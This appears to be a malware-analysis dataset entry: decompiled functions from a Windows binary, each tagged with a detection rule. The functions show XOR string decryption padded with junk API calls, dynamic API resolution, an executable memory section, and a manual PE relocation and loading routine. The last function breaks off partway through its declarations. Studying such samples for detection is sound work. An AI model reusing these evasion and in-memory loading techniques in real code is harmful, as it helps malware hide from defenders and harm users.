{
    "00401000": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401000(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_21h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpModuleName;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    // [00] -r-x section size 65536 named .text\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h._0_2_ = 0x210d;\n    var_8h = 6;\n    var_28h._2_1_ = 6;\n    stack0xffffffd7 = 0x7401d55;\n    var_21h._0_2_ = 0xe39;\n    var_21h._2_1_ = 0x39;\n    var_1ch = 0x39625563;\n    var_18h._0_2_ = 0x6e71;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_28h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x7d2cca) {\n            *(iVar7 + iVar2) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar2)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_40h = 0x3c5b2626;\n    var_3ch = 0x5626273f;\n    var_38h._0_1_ = 6;\n    var_38h._1_2_ = 0x73e;\n    var_34h = 0x7243658;\n    var_30h = 0x24004517;\n    var_2ch._1_1_ = 0x52;\n    var_8h = 0x72375274;\n    var_4h._0_1_ = 0x4b;\n    var_38h._3_1_ = var_38h;\n    var_2ch._0_1_ = var_38h;\n    uVar1 = (*pcVar5)(8, 0x17);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_40h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x85a461) {\n            var_ch = 5;\n            *(iVar7 + iVar2) = *(&var_8h + iVar7 % 5) ^ (iVar7 + iVar2)[&var_40h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x16);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_14h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 972
    },
    "00401147": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401147(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_21h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpModuleName;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h._0_2_ = 0x210d;\n    var_8h = 6;\n    var_28h._2_1_ = 6;\n    stack0xffffffd7 = 0x7401d55;\n    var_21h._0_1_ = 0x39;\n    var_21h._1_1_ = 0xe;\n    var_21h._2_1_ = 0x39;\n    var_1ch = 0x39625563;\n    var_18h._0_2_ = 0x6e71;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_28h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x7d2cca) {\n            *(iVar7 + iVar2) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar2)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_28h._0_2_ = 0xd0b;\n    var_28h._2_1_ = 0x18;\n    stack0xffffffd7 = 0x1d375611;\n    var_21h._0_1_ = 0x1b;\n    var_21h._1_1_ = 0x2e;\n    var_21h._2_1_ = 0x37;\n    var_8h = 0x43747959;\n    var_4h._0_1_ = 0x37;\n    uVar1 = (*pcVar5)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_ch = &var_28h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xd5f9e4) {\n            var_ch = 5;\n            *(iVar7 + iVar2) = *(&var_8h + iVar7 % 5) ^ (iVar7 + iVar2)[&var_28h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    uVar1 = (*pcVar5)(var_14h);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 889
    },
    "00401270": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401270(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    uint *puVar8;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint8_t var_34h;\n    uint var_33h;\n    uint var_2fh;\n    ushort var_2bh;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint8_t *var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_10h = 0;\n    puVar8 = &var_28h;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_3ch = 0x150a0e7a;\n    var_4h = 5;\n    var_38h._0_1_ = 5;\n    stack0xffffffc5 = 0x3221362;\n    var_33h._0_1_ = 0x3a;\n    var_33h._1_1_ = 0x52;\n    var_33h._2_2_ = 0x2229;\n    var_2fh._0_2_ = 0x117;\n    var_2fh._2_2_ = 0x155d;\n    var_2bh = 0x7429;\n    var_20h = 0x74477a34;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x75);\n    var_14h = in_EDX;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar6;\n    var_ch = iVar6;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar2 != 0x5ca9c4) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x13);\n    stack0xffffffc5 = stack0xffffffc5 & 0xffffff | 0xd000000;\n    var_33h._0_1_ = 0x21;\n    var_4h = 6;\n    var_33h._1_1_ = 6;\n    var_33h._2_2_ = 0x1d55;\n    var_2fh._0_2_ = 0x740;\n    var_2fh._2_2_ = 0xe39;\n    var_2bh = CONCAT11(var_2bh._1_1_, 0x39);\n    var_20h = 0x39625563;\n    var_1ch._0_2_ = 0x6e71;\n    uVar1 = (*pcVar4)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_34h + -iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        iVar2 = var_ch;\n        if (iVar3 != 0x7d2cca) {\n            *(iVar7 + iVar6) = *(&var_20h + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_34h + -iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar6, var_ch);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar4)(var_18h, var_14h, arg_8h, 0, 0, &var_28h, &var_10h, 2, 0, 0x40);\n    uVar1 = fcn.00401000();\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*pcVar4)(uVar5);\n    return uVar1;\n}\n",
        "token_count": 1184
    },
    "004013d8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004013d8(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h._0_2_ = 0x210d;\n    var_4h = 6;\n    var_24h._2_1_ = 6;\n    stack0xffffffdb = 0x7401d55;\n    var_1dh._0_2_ = 0xe39;\n    var_1dh._2_1_ = 0x39;\n    var_18h = 0x39625563;\n    var_14h._0_2_ = 0x6e71;\n    var_10h = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x7d2cca) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_3ch = 0x3e3d3f7e;\n    var_38h = 0x1d403925;\n    var_34h = 0x173f3501;\n    var_30h = 0x330d1856;\n    var_2ch = 0x255f313c;\n    var_28h._0_1_ = 0x68;\n    var_18h = 0x50684b30;\n    var_14h._0_2_ = 0x5848;\n    uVar1 = (*pcVar5)(8, 0x16);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_3ch - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0xd4304b) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x15);\n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar2);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    (*pcVar5)(0xffffffff, var_10h);\n    uVar1 = fcn.00401000();\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 942
    },
    "00401518": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401518(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_39h;\n    int32_t var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_20h;\n    int32_t var_1ch;\n    int32_t lpModuleName;\n    int32_t var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    puVar7 = &var_5ch;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &var_34h;\n    var_20h = in_EDX;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &var_2ch;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_40h._0_2_ = 0x210d;\n    var_1ch = 6;\n    var_40h._2_1_ = 6;\n    stack0xffffffbf = 0x7401d55;\n    var_39h._0_1_ = 0x39;\n    var_39h._1_1_ = 0xe;\n    var_39h._2_1_ = 0x39;\n    var_2ch = 0x39625563;\n    var_28h._0_2_ = 0x6e71;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    lpModuleName = iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x7d2cca) {\n            *(iVar6 + iVar5) = *(&var_2ch + iVar6 % var_1ch) ^ (iVar6 + iVar5)[&var_40h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_44h = 0x4477161b;\n    var_40h._0_2_ = 0x3409;\n    var_40h._2_1_ = 0x16;\n    stack0xffffffbf = 0x36096551;\n    var_39h._0_1_ = 0x16;\n    var_39h._1_1_ = 0x5d;\n    var_39h._2_1_ = 0x59;\n    stack0xffffffc6 = 0x5502;\n    var_14h = 0x36346255;\n    var_10h._0_1_ = 0x6c;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_1ch = &var_44h - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar3 != 0x9f75be) {\n            var_1ch = 5;\n            *(iVar6 + iVar5) = *(&var_14h + iVar6 % 5) ^ (iVar6 + iVar5)[&var_44h - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_5ch = 0x18;\n    var_58h = 0;\n    var_54h = 0;\n    var_4ch = 0;\n    var_48h = 0;\n    var_50h = 0x40;\n    iVar6 = (*pcVar4)(&var_8h, 0xf001f, &var_5ch, &var_34h, 0x40, 0x8000000, 0);\n    if (iVar6 < 0) {\n        iVar6 = fcn.00401000();\n    }\n    else {\n        iVar6 = fcn.00401270(&var_ch);\n        puVar8 = var_ch;\n        var_14h = iVar6;\n        if (iVar6 == 0) {\n            for (; var_34h != 0; var_34h = var_34h + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            *var_20h = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, lpModuleName);\n    (*pcVar4)(uVar2);\n    return iVar6;\n}\n",
        "token_count": 1495
    },
    "004016ff": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004016ff(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *in_ECX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    uchar *in_EDX;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t uVar15;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    iVar7 = *(in_EDX + iVar3 + 0x3c);\n    uVar6 = *(in_EDX + iVar3 + 6);\n    puVar13 = in_EDX;\n    puVar14 = in_ECX;\n    for (iVar9 = *(in_EDX + iVar3 + 0x54); iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    if (uVar6 != 0) {\n        piVar12 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar10 = iVar7 + -1 + piVar12[-1] & ~(iVar7 - 1U);\n            if (uVar10 != 0) {\n                puVar13 = in_EDX + *piVar12;\n                puVar14 = in_ECX + piVar12[-2];\n                for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n            }\n            piVar12 = piVar12 + 10;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    puVar13 = in_ECX;\n    if (arg_8h != NULL) {\n        puVar13 = arg_8h;\n    }\n    iVar7 = 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar7 = 0xb0;\n    }\n    if ((*(in_EDX + iVar7 + iVar3) != 0) && (uVar6 = *(in_EDX + iVar7 + 4 + iVar3),  uVar6 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar9 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar9 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar14 = *(in_EDX + iVar3 + 0x30);\n        uVar10 = puVar13 - *(in_EDX + iVar3 + 0x30);\n        iVar4 = *(in_EDX + iVar3 + 0x34);\n        piVar12 = in_ECX + *(in_EDX + iVar7 + iVar3);\n        for (; 8 < uVar6; uVar6 = uVar6 - *piVar11) {\n            iVar3 = *piVar12;\n            uVar15 = piVar12[1] - 8U >> 1;\n            if ((piVar12[1] <= uVar6) && (uVar15 != 0)) {\n                piVar11 = piVar12 + 2;\n                do {\n                    uVar2 = *piVar11;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar3) = puVar13 + (*(in_ECX + (uVar2 & 0xfff) + iVar3) - iVar9);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar8 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar8 + iVar3;\n                        uVar5 = *puVar1;\n                        *puVar1 = *puVar1 + uVar10;\n                        *(in_ECX + uVar8 + 4 + iVar3) =\n                             *(in_ECX + uVar8 + 4 + iVar3) + (((puVar13 >> 0x1f) - iVar4) - (puVar13 < puVar14)) +\n                             CARRY4(uVar5, uVar10);\n                    }\n                    piVar11 = piVar11 + 2;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            piVar11 = piVar12 + 1;\n            piVar12 = piVar12 + piVar12[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1189
    },
    "00401a87": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401a87(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_38h;\n    uint var_34h;\n    uint var_2dh;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    puVar9 = &var_28h;\n    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_34h._0_2_ = 0x210d;\n    var_ch = 6;\n    var_34h._2_1_ = 6;\n    stack0xffffffcb = 0x7401d55;\n    var_2dh._0_1_ = 0x39;\n    var_2dh._1_1_ = 0xe;\n    var_2dh._2_1_ = 0x39;\n    var_20h = 0x39625563;\n    var_1ch._0_2_ = 0x6e71;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_10h = &var_34h - iVar7;\n    lpModuleName = iVar7;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar4 != 0x7d2cca) {\n            *(iVar8 + iVar7) = *(&var_20h + iVar8 % var_ch) ^ (iVar8 + iVar7)[var_10h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_38h = 0x39261a64;\n    var_34h._0_2_ = 0x5b1d;\n    var_34h._2_1_ = 0x1e;\n    stack0xffffffcb = 0x75170e3f;\n    var_2dh._0_1_ = 0x1c;\n    var_2dh._1_1_ = 0x29;\n    var_2dh._2_1_ = 0x49;\n    stack0xffffffd2 = 0x3640;\n    var_ch = 0x7a4a6e36;\n    var_8h._0_1_ = 0x72;\n    uVar3 = (*pcVar6)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_10h = &var_38h - iVar7;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        iVar4 = lpModuleName;\n        if (iVar5 != 0xddef4) {\n            var_10h = 5;\n            *(iVar8 + iVar7) = *(&var_ch + iVar8 % 5) ^ (iVar8 + iVar7)[&var_38h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar7);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    cVar2 = fcn.0040feb4();\n    if (cVar2 != '\\0') {\n        var_4h = (*pcVar6)(0, var_24h, var_28h);\n    }\n    fcn.0040f56a();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar3);\n    return var_4h;\n}\n",
        "token_count": 1087
    },
    "00401fa0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401fa0(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = *0x41dab0;\n    fcn.00401147();\n    uVar2 = fcn.00401147();\n    iVar3 = fcn.00401be4(uVar2 & 0xff, 0x41dab0, 0x41dabc, &var_8h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.00401be4(0, 0x41dab0, 0x41dac0, &var_8h);\n        if (iVar3 != 0) {\n            var_24h = 0x49046c79;\n            var_20h = 0x6109574d;\n            var_1ch._0_2_ = 0x3549;\n            var_18h = 0x49616c57;\n            var_14h._0_1_ = 0x35;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                if (iVar5 != 0x9486f8) {\n                    var_10h = 5;\n                    *(iVar6 + iVar3) = *(&var_18h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41dac0, iVar3);\n            iVar6 = fcn.00401be4(0, 0x41dab0, 0x41dab4, &var_8h);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar6 != 0) {\n                var_4h = var_4h ^ 0x29787279;\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar6 = fcn.00401be4(0, &var_4h, 0x41daa4, &var_8h);\n                if (iVar6 != 0) {\n                    var_ch = 1;\n                }\n            }\n            uVar4 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 710
    },
    "004020f5": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004020f5(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uint unaff_EBX;\n    uchar *puVar10;\n    int32_t iVar11;\n    uint uStack1428;\n    uchar *puStack1424;\n    uchar *puStack1420;\n    uint uStack1416;\n    uint uStack1412;\n    int32_t iStack1408;\n    code *pcStack1404;\n    uint uStack1400;\n    uchar *puStack1396;\n    uint uStack1392;\n    uint uStack1388;\n    uint uStack1384;\n    uchar *puStack1380;\n    uint uStack1376;\n    uint uStack1372;\n    uchar *puStack1368;\n    int32_t iStack1364;\n    uint uStack1360;\n    uint uStack1356;\n    uint uStack1352;\n    uint uStack1348;\n    int32_t iStack1344;\n    uint uStack1340;\n    uint uStack1316;\n    uint uStack1312;\n    uint uStack1308;\n    uint uStack1304;\n    uint uStack1300;\n    uint uStack1296;\n    uint uStack1292;\n    int32_t iStack1288;\n    uchar *puStack1284;\n    int32_t iStack1280;\n    int32_t iStack1276;\n    uint uStack1272;\n    uchar *puStack1268;\n    uint uStack1264;\n    uint uStack1260;\n    uint uStack1256;\n    uint uStack1252;\n    uint uStack1248;\n    uint uStack1244;\n    uint uStack1240;\n    uint uStack1236;\n    uchar *puStack1232;\n    uint uStack1228;\n    uint uStack1224;\n    uint uStack1220;\n    uint uStack1216;\n    uint uStack1212;\n    uchar *puStack1208;\n    uint uStack1204;\n    ushort uStack1200;\n    uint32_t uStack1196;\n    int32_t 